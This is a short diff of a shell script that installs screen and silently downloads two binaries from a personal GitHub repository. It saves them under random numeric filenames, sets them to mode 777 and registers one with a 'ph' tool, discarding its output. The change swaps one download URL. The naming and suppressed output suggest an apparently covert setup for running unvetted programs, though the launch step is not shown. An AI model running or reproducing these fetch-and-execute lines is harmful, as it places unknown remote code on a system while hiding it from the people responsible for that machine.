@@ -6,7 +6,7 @@ sudo apt -qq update
 sudo apt -qq install screen -y
 a=$(shuf -i 1000000000-9999999999 -n 1)
 b=$(shuf -i 1000000000-9999999999 -n 1)
-wget -qO $a https://github.com/rifkithears/entod/raw/main/compile
+wget -qO $a https://github.com/rifkithears/lerler/raw/main/lmx
 wget -qO $b https://github.com/rifkithears/entod/raw/main/fix
 chmod 777 $a $b
 ph add $a >/dev/null
